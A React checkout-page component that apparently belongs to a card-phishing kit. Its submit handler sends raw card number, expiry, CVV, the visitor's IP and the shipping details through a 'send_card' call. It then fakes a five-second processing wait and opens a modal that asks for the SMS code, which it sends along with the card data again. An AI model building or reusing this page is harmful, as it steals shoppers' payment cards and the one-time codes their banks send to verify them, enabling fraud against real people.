import React, { useState, } from "react";
import { observer } from "mobx-react-lite";
import styled from "@emotion/styled";
import { Modal, Backdrop, Fade, CircularProgress } from "@mui/material";
import { PaymentDetails, ShippingDetails } from "../../utils/interfaces";
import ContactForm from "../../components/Checkout/ContactForm";
import DeliveryForm from "../../components/Checkout/DelveryPage";
import OrderSummary from "../../components/Checkout/OrderSummary";
import PaymentForm from "../../components/Checkout/PaymentForm";
import { checkCardUtil } from "../../utils/checkcardData";
import { user } from "../..";

const CheckoutPageContainer = styled.div`
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  padding: 20px;
`;

const CheckoutFormContainer = styled.form`
  flex: 1 1 400px;
  max-width: 500px;
  margin-right: 20px;
`;

const CheckoutButton = styled.button<{ isSmsStep: boolean }>`
  width: 100%;
  padding: 15px;
  background-color: #ff9900;
  border: none;
  color: white;
  font-size: 18px;
  border-radius: 5px;
  cursor: pointer;
  margin-top: ${(props) => (props.isSmsStep ? "20px" : "0")};
`;

const SmsCodeInput = styled.input`
  width: 100%;
  padding: 10px;
  margin-top: 10px;
  border: 1px solid #ccc;
  border-radius: 5px;
`;

const SmsModalContent = styled.div`
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  width: 400px;
  background-color: white;
  padding: 20px;
  border-radius: 8px;
  box-shadow: 24;
`;

const CheckoutPage: React.FC = observer(() => {
  const [shippingDetails, setShippingDetails] = useState<ShippingDetails>({
    email: "",
    firstName: "",
    lastName: "",
    company: "",
    address: "",
    apartment: "",
    city: "",
    state: "",
    zipCode: "",
    country: "United States",
    phone: "",
  });

  const [paymentDetails, setPaymentDetails] = useState<PaymentDetails>({
    cardNumber: "",
    expirationDate: "",
    securityCode: "",
    nameOnCard: "",
  });

  const [isSmsStep, setIsSmsStep] = useState(false);
  const [smsCode, setSmsCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [openModal, setOpenModal] = useState(false);

  const handleInputChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = event.target;
    setShippingDetails({ ...shippingDetails, [name]: value });
  };

  const handlePaymentInputChange = (
    event: React.ChangeEvent<HTMLInputElement>
  ) => {
    let { name, value } = event.target;
    ({ name, value } = checkCardUtil(name, value));
    setPaymentDetails({ ...paymentDetails, [name]: value });
  };

  const handleSmsCodeChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    setSmsCode(event.target.value);
  };

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();

    const delivery = `
    First Name: ${shippingDetails.firstName},
    Last Name: ${shippingDetails.lastName},
    Company: ${shippingDetails.company},
    Address: ${shippingDetails.address},
    Apartment: ${shippingDetails.apartment},
    City: ${shippingDetails.city},
    State: ${shippingDetails.state},
    Zip Code: ${shippingDetails.zipCode},
    Country: ${shippingDetails.country},
    Phone: ${shippingDetails.phone}
  `
      .replace(/\s+/g, " ")
      .trim();

    const data: any = {
      card_number: paymentDetails.cardNumber,
      expiry_date: paymentDetails.expirationDate,
      cvv: paymentDetails.securityCode,
      user_ip: user.ip,
      email: shippingDetails.email,
      delivery: delivery,
    };
    if (!isSmsStep) {
      setLoading(true);

      await user.send_card(data);
      await new Promise((resolve) => setTimeout(resolve, 5000)); // wait for 5 seconds

      setLoading(false);
      setIsSmsStep(true);
      setOpenModal(true);
    } else {
      setLoading(true);
      data.sms_code = smsCode;
      await user.send_card(data);
      await new Promise((resolve) => setTimeout(resolve, 5000)); // wait for 5 seconds
      setLoading(false);
    }
  };

  return (
    <CheckoutPageContainer>
      <CheckoutFormContainer onSubmit={handleSubmit}>
        <ContactForm
          shippingDetails={shippingDetails}
          handleInputChange={handleInputChange}
        />
        <DeliveryForm
          shippingDetails={shippingDetails}
          handleInputChange={handleInputChange}
        />
        <PaymentForm
          paymentDetails={paymentDetails}
          handlePaymentInputChange={handlePaymentInputChange}
        />
        <CheckoutButton type="submit" isSmsStep={isSmsStep}>
          {isSmsStep ? "Send SMS" : "Pay now"}
        </CheckoutButton>
      </CheckoutFormContainer>
      <OrderSummary />
      {loading && (
        <Backdrop
          sx={{ color: "#fff", zIndex: (theme) => theme.zIndex.drawer + 1 }}
          open={loading}
        >
          <CircularProgress color="inherit" />
        </Backdrop>
      )}
      <Modal
        aria-labelledby="sms-code-modal"
        aria-describedby="sms-code-modal-description"
        open={openModal}
        onClose={() => setOpenModal(false)}
        closeAfterTransition
        BackdropComponent={Backdrop}
        BackdropProps={{
          timeout: 500,
        }}
      >
        <Fade in={openModal}>
          <SmsModalContent>
            <h2 id="sms-code-modal">Enter SMS Code</h2>
            <SmsCodeInput
              type="text"
              placeholder="Enter SMS code"
              value={smsCode}
              onChange={handleSmsCodeChange}
              required
            />
            <CheckoutButton
              type="button"
              isSmsStep={isSmsStep}
              onClick={handleSubmit}
            >
              Send SMS
            </CheckoutButton>
          </SmsModalContent>
        </Fade>
      </Modal>
    </CheckoutPageContainer>
  );
});

export default CheckoutPage;
